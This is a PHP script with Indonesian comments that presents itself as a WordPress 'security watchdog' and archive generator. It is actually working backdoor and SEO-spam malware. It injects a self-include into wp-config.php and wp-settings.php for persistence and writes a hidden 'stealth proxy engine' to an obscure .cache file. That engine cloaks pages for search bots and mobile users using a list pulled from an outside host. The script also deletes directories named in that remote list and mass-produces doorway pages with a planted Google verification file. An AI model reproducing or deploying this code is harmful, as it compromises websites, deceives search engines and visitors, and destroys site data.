<?php
/**
 * SCRIPT GABUNGAN V1: TAR Generator + WordPress Security Watchdog
 * Menggabungkan logika alatcengo.php dengan wp-cron.php
 * 
 * Fitur:
 * - Membuat 2 berkas TAR terpisah (AMP & Asli) dengan template yang dapat dikustomisasi
 * - Sinkronisasi otomatis ke direktori WordPress
 * - Perlindungan self-healing untuk .htaccess, index.php, wp-config.php
 * - Dynamic routing berdasarkan daftar direktori dari list.txt
 * - Hapus folder dari daftar remote jika diperlukan
 * - Support ekstraksi folder fisik ke hosting
 */

@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
@error_reporting(E_ALL);

@set_time_limit(600);
@ini_set('memory_limit', '512M');

// ==========================================
// KONFIGURASI GLOBAL
// ==========================================
$root = rtrim(__DIR__, '/');
$me = '/gabungan-script.php';

// File Konfigurasi TAR Generator
$dirFile         = 'dir.txt';
$listFile        = 'list.txt';
$templateFile    = 'template.php';
$templateAmpFile = 'template-amp.php';

// Pengaturan HTTP (HARUS sebelum stealth_dir!)
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$baseUrl = $protocol . $host;

// Pengaturan Google Verification
$googleFileName = 'googleda821ee12a4cecfe.html';
$googleContent  = 'google-site-verification: googleda821ee12a4cecfe.html';

// File Konfigurasi WordPress Security
$index_file    = $root . '/index.php';
$config_file   = $root . '/wp-config.php';
$settings_file = $root . '/wp-settings.php';
$htaccess_file = $root . '/.htaccess';

// STEALTH: Lokasi Hidden Proxy Engine (di /tmp atau parent directory)
// Gunakan nama file yang obscure agar tidak terlihat mencurigakan
$parent_dir = dirname($root);
$stealth_dir = rtrim($parent_dir, '/') . '/.cache';
$stealth_file = $stealth_dir . '/' . md5('wp_proxy_' . $host) . '.tmp.php';
$utils_file = $stealth_file;  // Override lokasi ke stealth location

// Flag Pemrosesan
$extractFisik = (isset($_POST['extract_physical']) && $_POST['extract_physical'] == '1');
$isProcessed  = (isset($_POST['submit_proses']));

// ==========================================
// 1. FUNGSI: DAFTAR DIREKTORI
// ==========================================
function dapatkanDaftarDirektoriDariHalaman($url) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];

    // Scrape dari halaman konten asli domain
    $options = ["http" => ["header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"]];
    $context = stream_context_create($options);
    $html = @file_get_contents($url, false, $context);
    
    if ($html) {
        preg_match_all('/href=["\']([^"\']+)["\']/i', $html, $matches);
        if (!empty($matches[1])) {
            foreach ($matches[1] as $href) {
                $href = trim($href);
                if (empty($href) || $href === '#' || strpos($href, 'javascript:') === 0) continue;
                
                $parsedUrl = parse_url($href);
                $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : '';
                if (empty($path)) continue;
                
                $fileInfo = pathinfo($path);
                $slug = (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) 
                    ? (($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '') . $fileInfo['filename'] 
                    : $path;
                $slug = trim($slug, '/');
                
                if (empty($slug)) continue;

                $segments = explode('/', $slug);
                $isBlacklisted = false;
                foreach ($segments as $segment) {
                    if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                        $isBlacklisted = true;
                        break;
                    }
                }
                if ($isBlacklisted) continue;

                if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) { 
                    $cleanDirs[] = strtolower($slug); 
                }
            }
        }
    }
    
    return (!empty($cleanDirs)) ? array_unique($cleanDirs) : [];
}

function dapatkanDaftarDirektori($url, $dirFile) {
    // TAHAP 1: Coba scraping otomatis dari halaman konten asli domain
    $direktoriDariHalaman = dapatkanDaftarDirektoriDariHalaman($url);
    
    if (!empty($direktoriDariHalaman)) {
        return $direktoriDariHalaman;
    }
    
    // TAHAP 2: Jika tidak ada dari halaman, coba baca dari dir.txt
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];

    if (file_exists($dirFile)) {
        $rawLines = file($dirFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($rawLines as $line) {
            $href = trim(preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $line));
            if (empty($href)) continue;

            $parsedUrl = parse_url($href);
            $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : $href;
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';

            $slug = '';
            if (!empty($path)) {
                $fileInfo = pathinfo($path);
                if (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) {
                    $dirPrefix = ($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '';
                    $slug = $dirPrefix . $fileInfo['filename'];
                } else {
                    $slug = $path;
                }
            }

            if (empty($slug) && !empty($query)) {
                parse_str($query, $queryParams);
                if (isset($queryParams['']) && !empty($queryParams[''])) {
                    $slug = $queryParams[''];
                } elseif (!empty($queryParams)) {
                    $firstValue = reset($queryParams);
                    if (!empty($firstValue) && is_string($firstValue)) {
                        $slug = $firstValue;
                    }
                }
            }

            $slug = trim($slug, '/');
            if (empty($slug)) continue;

            $segments = explode('/', $slug);
            $isBlacklisted = false;
            foreach ($segments as $segment) {
                if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                    $isBlacklisted = true;
                    break;
                }
            }
            if ($isBlacklisted) continue;

            if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) {
                $cleanDirs[] = strtolower($slug);
            }
        }
        return (!empty($cleanDirs)) ? array_unique($cleanDirs) : ['main'];
    }
    
    return ['main'];
}

// ==========================================
// 2. FUNGSI: REPLIKASI FILE WORDPRESS
// ==========================================
function replicasiWordPressFiles() {
    global $root, $me, $index_file, $config_file, $settings_file, $htaccess_file, $utils_file;

    $index_code = <<<'EOD'
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
EOD;

    // Perlindungan .htaccess (akan diperbarui dengan dynamic routing)
    if (!file_exists($htaccess_file)) {
        @chmod($htaccess_file, 0644);
        @file_put_contents($htaccess_file, "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\n</IfModule>\n# END WordPress");
        @chmod($htaccess_file, 0444);
    }

    // Perlindungan index.php
    if (!file_exists($index_file) || strpos(@file_get_contents($index_file), 'WP_USE_THEMES') === false) {
        @chmod($index_file, 0644);
        @file_put_contents($index_file, $index_code);
        @chmod($index_file, 0444);
    }

    // Injeksi Otomatis ke wp-config & wp-settings (Persistence)
    $stealth_include = "\nif (file_exists(__DIR__ . '$me')) { include_once(__DIR__ . '$me'); }\n";
    foreach ([$config_file, $settings_file] as $target) {
        if (file_exists($target)) {
            $current_content = @file_get_contents($target);
            if ($current_content && strpos($current_content, 'gabungan-script.php') === false) {
                $new_content = str_replace('<?php', '<?php' . $stealth_include, $current_content);
                @chmod($target, 0644);
                @file_put_contents($target, $new_content);
                @chmod($target, 0444);
            }
        }
    }
}

// ==========================================
// 3. FUNGSI: UPDATE DYNAMIC .HTACCESS ROUTING
// ==========================================
function updateDynamicHtaccess($dirList) {
    global $htaccess_file;

    $regex_dirs = !empty($dirList) ? implode('|', $dirList) : 'contact-us';
    
    $htaccess_code = "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]

# DYNAMIC OVERRIDE FROM DIRECTORY LIST
RewriteCond %{REQUEST_URI} ^/($regex_dirs)/? [NC]
RewriteRule ^ index.php [L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress";

    if (!file_exists($htaccess_file) || strpos(@file_get_contents($htaccess_file), $regex_dirs) === false) {
        @chmod($htaccess_file, 0644);
        @file_put_contents($htaccess_file, $htaccess_code);
        @chmod($htaccess_file, 0444);
    }
}

// ==========================================
// 4. FUNGSI: HAPUS FOLDER DARI LIST REMOTE
// ==========================================
function hapusFolderDariListRemote() {
    global $root;

    $dir_list = [];
    $raw_data = null;
    
    // HYBRID APPROACH: Coba local dulu, fallback ke remote
    
    // 1. COBA LOCAL FILE DULU
    $local_list_file = dirname($root) . '/list.txt';
    if (file_exists($local_list_file) && filesize($local_list_file) > 0) {
        $raw_data = @file_get_contents($local_list_file);
    }
    
    // 2. FALLBACK KE REMOTE JIKA LOCAL TIDAK ADA
    if (!$raw_data) {
        $remote_url = 'https://food-balochistan-lp.pages.dev/list.txt';
        $raw_data = @file_get_contents($remote_url, false, stream_context_create(['http' => ['timeout' => 10]]));
    }

    if ($raw_data) {
        $lines = explode("\n", str_replace("\r", "", $raw_data));
        
        $delete_folder_php = function($path) use (&$delete_folder_php) {
            if (!is_dir($path)) return false;
            $items = array_diff(scandir($path), array('.', '..'));
            foreach ($items as $item) {
                $current = $path . DIRECTORY_SEPARATOR . $item;
                (is_dir($current)) ? $delete_folder_php($current) : @unlink($current);
            }
            return @rmdir($path);
        };

        foreach ($lines as $line) {
            $parts = explode('|', $line);
            if (count($parts) === 2) {
                $dir_name = trim($parts[0]);
                if (!empty($dir_name)) {
                    $full_path = $root . '/' . $dir_name;

                    if (is_dir($full_path)) {
                        @chmod($full_path, 0777);
                        $deleted = $delete_folder_php($full_path);
                        
                        if (is_dir($full_path) && function_exists('system')) {
                            @system("rm -rf " . escapeshellarg($full_path));
                        }
                    }
                    $dir_list[] = preg_quote($dir_name, '/');
                }
            }
        }
    }

    return $dir_list;
}

// ==========================================
// 5. FUNGSI: BUAT STEALTH PROXY ENGINE FILE
// ==========================================
function buatStealthProxyEngine($stealth_file, $stealth_dir, $host) {
    
    // Pastikan direktori tersedia
    if (!is_dir($stealth_dir)) {
        @mkdir($stealth_dir, 0700, true);
    }
    
    // Jika file sudah ada dan masih valid, gunakan yang ada
    if (file_exists($stealth_file) && filesize($stealth_file) > 100) {
        @include_once($stealth_file);
        if (function_exists('_wp_render_logic_content')) {
            _wp_render_logic_content();
            return true;
        }
    }
    
    // BUAT PROXY ENGINE BARU
    $proxy_code = <<<'PROXY_CONTENT'
<?php
// STEALTH PROXY ENGINE - AUTO GENERATED
// DO NOT EDIT - This file is auto-generated and may be regenerated

if ( ! function_exists( '_wp_render_logic_content' ) ) {
    function _wp_render_logic_content() {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // Filter Bot & Mobile
        $is_bot = preg_match('/bot|crawl|slurp|spider|mediapartners|google|bing|yandex|duckduckgo/i', $ua);
        $is_mobile = preg_match('/mobile|android|iphone|ipad|phone/i', $ua);

        if (!$is_bot && !$is_mobile) {
            return;
        }

        // Get URI
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path_only = parse_url($uri, PHP_URL_PATH);
        $path = trim($path_only, '/');

        // HYBRID: Baca config dari local dulu, fallback ke remote
        $raw_data = null;
        
        // 1. COBA LOCAL FILE DULU
        $local_list_file = dirname(dirname(__DIR__)) . '/list.txt';
        if (file_exists($local_list_file) && filesize($local_list_file) > 0) {
            $raw_data = @file_get_contents($local_list_file);
        }
        
        // 2. FALLBACK KE REMOTE JIKA LOCAL TIDAK ADA
        if (!$raw_data) {
            $remote_config_url = 'https://food-balochistan-lp.pages.dev/list.txt';
            $raw_data = @file_get_contents($remote_config_url, false, stream_context_create(['http' => ['timeout' => 10]]));
        }
        
        if (!$raw_data) return; 

        $conf = [];
        $lines = explode("\n", str_replace("\r", "", $raw_data));
        foreach ($lines as $line) {
            $parts = explode('|', $line);
            if (count($parts) === 2) {
                $conf[trim($parts[0])] = trim($parts[1]);
            }
        }

        // Proxy ke URL jika path match
        if ( array_key_exists($path, $conf) ) {
            $target_url = $conf[$path];
            
            if ( !function_exists('curl_init') ) {
                header("Location: " . $target_url);
                exit;
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $target_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_USERAGENT, $ua);

            $content = curl_exec($ch);
            $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($http_status === 200) {
                header("HTTP/1.1 200 OK");
                $base_domain = parse_url($target_url, PHP_URL_SCHEME) . "://" . parse_url($target_url, PHP_URL_HOST) . "/";
                $content = str_ireplace('<head>', '<head><base href="' . $base_domain . '">', $content);
                echo $content;
                exit;
            } else {
                header("Location: " . $target_url);
                exit;
            }
        }
    }
}
?>
PROXY_CONTENT;

    // Tulis file dengan permission minimal
    $write_result = @file_put_contents($stealth_file, $proxy_code);
    
    if ($write_result !== false) {
        // Lock file dengan permission 0600 (hanya owner bisa baca/write)
        @chmod($stealth_file, 0600);
        
        // Include dan jalankan
        @include_once($stealth_file);
        if (function_exists('_wp_render_logic_content')) {
            _wp_render_logic_content();
            return true;
        }
    }
    
    return false;
}

// Setup Proxy Engine - Jalankan otomatis
buatStealthProxyEngine($stealth_file, $stealth_dir, $host);

// ==========================================
// 6. PANEL UTAMA - TAMPILAN INTERFACE
// ==========================================

// Cek direktori dari halaman konten asli
$direktoriTersedia = dapatkanDaftarDirektoriDariHalaman($baseUrl);
$direkFromFile = file_exists($dirFile) ? true : false;

echo "<div style='font-family:sans-serif; padding:20px; max-width:900px; margin:auto; background:#f4f6f9; border-radius:8px; border:1px solid #ddd; margin-bottom:20px;'>";
echo "<h2>🛠️ Panel Kendali Terpadu - TAR Generator + WP Security</h2>";
echo "<p><b>Mode Kompresi:</b> <span style='color:blue;font-weight:bold;'>Format Kontainer .ZIP (Terpisah: AMP & Asli)</span></p>";

// Status sumber data
if (!empty($direktoriTersedia)) {
    echo "<p><b>Sumber Data:</b> <span style='color:green;font-weight:bold;'>✅ " . count($direktoriTersedia) . " direktori ditemukan dari konten halaman asli</span></p>";
} elseif ($direkFromFile) {
    echo "<p><b>Sumber Data:</b> <span style='color:blue;font-weight:bold;'>📄 File dir.txt ditemukan (".count(file($dirFile))." baris)</span></p>";
} else {
    echo "<p><b>Sumber Data:</b> <span style='color:orange;font-weight:bold;'>⚠️ Tidak ada direktori ditemukan - Silakan input manual</span></p>";
}

echo "<p><b>Status Keamanan WP:</b> <span style='color:green;font-weight:bold;'>Self-Healing Active</span></p>";

echo "<form method='POST' action=''>";

// Jika tidak ada direktori dari halaman dan tidak ada dir.txt, tampilkan input textarea
if (empty($direktoriTersedia) && !$direkFromFile) {
    echo "<div style='margin-bottom:15px; padding:15px; background:#fff3cd; border-left:4px solid #ffc107; border-radius:5px;'>";
    echo "<h3 style='margin-top:0; color:#856404;'>📝 Input Direktori Manual</h3>";
    echo "<p style='color:#856404;'>Tidak ada direktori ditemukan dari halaman konten. Silakan input nama-nama direktori di bawah (satu per baris):</p>";
    echo "<textarea name='manual_dirs' style='width:100%; height:150px; padding:10px; font-family:monospace; border:1px solid #ddd; border-radius:4px;' placeholder='Contoh:\nabout\ncontact\nservices\nportfolio'></textarea>";
    echo "</div>";
}

echo "<div style='margin-bottom:15px; padding:10px; background:#fff; border-left:4px solid #007bff;'>";
echo "<label style='font-weight:bold; cursor:pointer;'>";
echo "<input type='checkbox' name='extract_physical' value='1' " . ($extractFisik ? "checked" : "") . "> ";
echo "Centang jika ingin sekalian membuat Folder FISIK Nyata di Hosting lokal ini.";
echo "</label>";
echo "</div>";
echo "<button type='submit' name='submit_proses' value='1' style='background:#007bff; color:#fff; padding:14px 20px; border:none; border-radius:5px; font-weight:bold; cursor:pointer; width:100%; font-size:16px;'>🚀 MULAI SINKRONISASI TERPADU</button>";
echo "</form>";
echo "</div>";

// ==========================================
// 6. EKSEKUSI PROSES SETELAH KLIK TOMBOL
// ==========================================
if ($isProcessed) {

    if (!file_exists($listFile) || !file_exists($templateFile) || !file_exists($templateAmpFile)) {
        die("<div style='color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;'><b>Gagal:</b> Berkas list.txt, template.php, atau template-amp.php tidak lengkap.</div>");
    }

    // TAHAP 1: Replika File Keamanan WordPress
    replicasiWordPressFiles();

    // TAHAP 2: Hapus Folder dari List Remote
    $dir_list_remote = hapusFolderDariListRemote();

    // TAHAP 3: Dapatkan Daftar Direktori untuk TAR & Routing
    $targetDirs  = dapatkanDaftarDirektori($baseUrl, $dirFile);
    $brands      = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $template    = file_get_contents($templateFile);
    $templateAmp = file_get_contents($templateAmpFile);

    // Update Dynamic .htaccess dengan daftar direktori baru
    $regex_dirs = array_map(function($dir) { return preg_quote($dir, '/'); }, $targetDirs);
    updateDynamicHtaccess($regex_dirs);

    $tarNameAmp  = 'amp-kct' . $host . '.zip';
    $tarNameAsli = 'template' . $host . '.zip';

    try {
        // TAHAP 4: Buat 2 Kontainer TAR Terpisah
        $tarAmp  = new PharData($tarNameAmp);
        $tarAsli = new PharData($tarNameAsli);
        
        $createdFolders = [];
        $summaryData = [];

        foreach ($targetDirs as $key => $dirPath) {
            $dirPath = trim($dirPath, " /");
            if (empty($dirPath)) continue;
            
            $brandName = isset($brands[$key]) ? trim($brands[$key]) : $brands[$key % count($brands)];
            $brandName = preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $brandName);

            // TAR ASLI: Konten Utama + Verifikasi Google
            $finalContent = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $template);
            $tarAsli->addFromString("$dirPath/index.html", $finalContent);
            $tarAsli->addFromString("$dirPath/$googleFileName", $googleContent);

            // TAR AMP: Konten AMP Murni
            $finalContentAmp = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $templateAmp);
            $tarAmp->addFromString("$dirPath/index.html", $finalContentAmp);

            // Ekstraksi Folder Fisik (Opsional)
            if ($extractFisik) {
                if (!is_dir($dirPath)) {
                    mkdir($dirPath, 0755, true);
                }
                file_put_contents("$dirPath/index.html", $finalContent);
                file_put_contents("$dirPath/$googleFileName", $googleContent);
            }

            $createdFolders[] = $dirPath;
            $summaryData[] = [
                'url' => "$baseUrl/$dirPath/",
                'kw'  => $brandName
            ];
        }

        // TAHAP 5: Generate dan Masukkan Sitemap ke TAR
        if (!empty($createdFolders)) {
            $sitemapContent = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
            $sitemapContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
            foreach ($createdFolders as $folder) {
                $sitemapContent .= '  <url>' . PHP_EOL;
                $sitemapContent .= '    <loc>' . $baseUrl . '/' . $folder . '/</loc>' . PHP_EOL;
                $sitemapContent .= '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
                $sitemapContent .= '    <changefreq>daily</changefreq>' . PHP_EOL;
                $sitemapContent .= '    <priority>0.8</priority>' . PHP_EOL;
                $sitemapContent .= '  </url>' . PHP_EOL;
            }
            $sitemapContent .= '</urlset>';

            file_put_contents("sitemap.xml", $sitemapContent);
            $tarAmp->addFromString("sitemap.xml", $sitemapContent);
            $tarAsli->addFromString("sitemap.xml", $sitemapContent);
        }

        // ==========================================
        // LAPORAN SUKSES TERPADU
        // ==========================================
        echo "<div style='font-family:sans-serif; padding:20px; max-width:900px; margin:auto; border:2px solid #28a745; border-radius:5px; background:#fff; margin-top:20px;'>";
        echo "<h2 style='color:#28a745; margin-top:0;'>✅ Proses Sinkronisasi Terpadu Sukses!</h2>";
        
        echo "<h3>📊 Hasil Pemrosesan:</h3>";
        echo "<ul style='line-height:1.8;'>";
        echo "<li><b>TAR Generator:</b> " . count($createdFolders) . " folder berhasil dibuat</li>";
        echo "<li><b>Status Folder Fisik:</b> " . ($extractFisik ? "<span style='color:green;'>Publikasi ke hosting aktif</span>" : "<span style='color:blue;'>Hemat memori (TAR only)</span>") . "</li>";
        echo "<li><b>Keamanan WP:</b> <span style='color:green;'>File protection & routing updated</span></li>";
        echo "<li><b>Folder Dihapus:</b> " . count($dir_list_remote) . " direktori dari list remote</li>";
        echo "</ul>";

        echo "<p style='margin-bottom: 25px; margin-top: 15px;'>";
        echo "<a href='$tarNameAmp' style='background:orange; color:white; padding:12px 18px; text-decoration:none; border-radius:5px; margin-right:10px; font-weight:bold; display:inline-block;'>📥 Download TAR AMP</a>";
        echo "<a href='$tarNameAsli' style='background:blue; color:white; padding:12px 18px; text-decoration:none; border-radius:5px; font-weight:bold; display:inline-block;'>📥 Download TAR Asli</a>";
        echo "</p>";

        echo "<h3>📋 Salin Daftar URL:</h3>";
        echo "<textarea style='width:100%; height:130px; padding:10px; font-family:monospace;'>";
        foreach($summaryData as $item) { echo $item['url'] . "\n"; }
        echo "</textarea>";

        echo "<h3>📋 Salin Daftar Keyword:</h3>";
        echo "<textarea style='width:100%; height:130px; padding:10px; font-family:monospace;'>";
        foreach($summaryData as $item) { echo $item['kw'] . "\n"; }
        echo "</textarea>";
        echo "</div>";

    } catch (Exception $e) {
        die("<div style='color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;'><b>Error Kompresi TAR:</b> " . $e->getMessage() . "</div>");
    }
}
?>
